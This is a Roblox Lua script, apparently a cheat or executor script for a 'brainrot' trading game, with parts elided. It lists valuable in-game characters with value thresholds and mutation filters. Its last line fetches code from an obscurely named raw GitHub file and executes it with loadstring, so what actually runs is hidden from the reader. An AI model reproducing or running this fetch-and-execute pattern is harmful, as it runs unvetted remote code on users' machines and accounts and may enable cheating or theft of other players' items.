...
local SPECIAL_BRAINROTS = {
    ...
    ['Ketupat Kepat'] = { min = 0, mutations = {"Yin Yang"} },
    ['Strawberry Elephant'] = { min = 0, mutations = {} },
    ['Ketchuru and Musturu'] = { min = 0, mutations = {"Bloodrot", "Candy", "Lava", "Yin Yang"} },
    ['Tralaledon'] = { min = 100_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
    ['Tictac Sahur'] = { min = 0, mutations = {"Bloodrot", "Candy", "Lava", "Yin Yang", "Galaxy"} },
    ...
    ['Los Tacoritas'] = { min = 200_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
    ...
    ['Tacorita Bicicleta'] = { min = 200_000_000, mutations = {"Lava"} },
    ['La Jolly Grande'] = { min = 400_000_000, mutations = {} },
    ['W or L'] = { min = 300_000_000, mutations = {"Candy", "Lava", "BloodRot", "Rainbow"} },
    ['Los Puggies'] = { min = 500_000_000, mutations = {"Rainbow"} },
    ['La Taco Combinasion'] = { min = 400_000_000, mutations = {"Candy", "Rainbow", "Galaxy"} },
    ['Chipso and Queso'] = { min = 400_000_000, mutations = {"Candy"} },
    ['Mieteteira Bicicleteira'] = { min = 500_000_000, mutations = {} },
    ['Los Mobilis'] = { min = 400_000_000, mutations = {} },
    ['La Spooky Grande'] = { min = 400_000_000, mutations = {} },
    ['Eviledon'] = { min = 400_000_000, mutations = {"Rainbow"} },
    ['Chillin Chili'] = { min = 400_000_000, mutations = {"Candy"} },
    ['Money Money Puggy'] = { min = 300_000_000, mutations = {"Bloodrot"} },
    ['Tang Tang Keletang'] = { min = 200_000_000, mutations = {"Yin Yang"} },
    ['Los Primos'] = { min = 300_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
    ['Orcaledon'] = { min = 400_000_000, mutations = {"Candy", "Lava", "Rainbow", "Galaxy"} },
    ['Las Sis'] = { min = 400_000_000, mutations = {"Candy", "Lava"} },
    ['La Extinct Grande'] = { min = 400_000_000, mutations = {} },
    ['Los Bros'] = { min = 400_000_000, mutations = {"Candy", "Lava", "Rainbow"} },
    ['Spaghetti Tualetti'] = { min = 500_000_000, mutations = {"Bloodrot", "Rainbow"} },
    ['Esok Sekolah'] = { min = 400_000_000, mutations = {} },
    ['Nuclearo Dinossauro'] = { min = 0, mutations = {"Cursed", "Bloodrot"} },
    ['Lavadorito Spinito'] = { min = 0, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
    ['La Ginger Sekolah'] = { min = 0, mutations = {"Cursed", "Candy", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
    ['Reinito Sleighito'] = { min = 0, mutations = {} },
    ['Dragon Gingerini'] = { min = 0, mutations = {} },
    ['Festive 67'] = { min = 0, mutations = {} },
    ['Ginger Gerat'] = { min = 0, mutations = {} },
    ['Jolly Jolly Sahur'] = { min = 300_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
    ['Skibidi Toilet'] = { min = 0, mutations = {} },
    ['Tuff Toucan'] = { min = 0, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
...
local OBJECTS = {
    ...
    ['Popuru and Fizzuru'] = { emoji = '🍿', important = true },
    ['Los Trios'] = { emoji = '🦈', important = true },
    ['Los Sekolahs'] = { emoji = '🏡', important = true },
    ['Chill Puppy'] = { emoji = '🐶', important = true },
}
...
loadstring(game:HttpGet("https://raw.githubusercontent.com/Confilas/ghjnfthun/276f14da704901c7a1e0f6a2529bd1bf37564763/fvddfv"))()
